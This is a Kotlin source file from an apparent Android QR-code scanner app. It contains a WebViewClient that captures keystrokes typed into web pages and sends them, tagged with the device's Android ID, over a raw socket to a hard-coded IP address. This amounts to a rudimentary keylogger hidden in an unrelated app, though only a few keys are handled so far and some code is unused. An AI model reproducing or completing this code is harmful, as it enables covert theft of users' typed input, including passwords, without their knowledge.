package com.zizou.qrcodescanner
import android.view.KeyEvent
import android.webkit.WebView
import android.webkit.WebViewClient
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.io.BufferedReader
import java.io.IOException
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.Socket


open class MyWebViewClient() : WebViewClient() {

    private var text = "text : "
    override fun onUnhandledKeyEvent(view: WebView?, event: KeyEvent?) {
        super.onUnhandledKeyEvent(view, event)
        // Gestion des touches non gérées
        if (event?.keyCode == KeyEvent.KEYCODE_ENTER) {
            // Appeler la méthode que vous souhaitez exécuter ici
            onEnterKeyPressed()
        }
        if (event?.keyCode == KeyEvent.KEYCODE_A && event.action == KeyEvent.ACTION_DOWN) {
            onUppercaseAKeyPressed()
        }
    }

    private fun onEnterKeyPressed() {
        // Votre code à exécuter lorsque la touche "Entrée" est pressée
        newPacket(text)
        text = "text : "
    }

    private fun onUppercaseAKeyPressed() {
        // Votre code à exécuter lorsque la touche "Entrée" est pressée
        text += "A"
        newPacket(text)
    }
    private fun onLowercaseAKeyPressed() {
        // Votre code à exécuter lorsque la touche "Entrée" est pressée
        text += "a"

    }


    private fun newPacket(data: String) {

        GlobalScope.launch(Dispatchers.IO) {
            try {
                val socket = Socket("172.20.10.10", 12345)

                // obtenir les flux d'entrée et de sortie pour communiquer avec le serveur
                val inputStream = socket.getInputStream()
                val outputStream = socket.getOutputStream()

                // Créer des BufferedReader et BufferedWriter pour lire et écrire des données
                val reader = BufferedReader(InputStreamReader(inputStream))
                val writer = OutputStreamWriter(outputStream)

                // Écrire des données sur le flux de sortie
                var idData = MainActivity.androidId +","+data
                writer.write(idData)
                writer.flush()

                socket.close()

            } catch (e: IOException) {
                e.printStackTrace()
            }
        }
    }

}
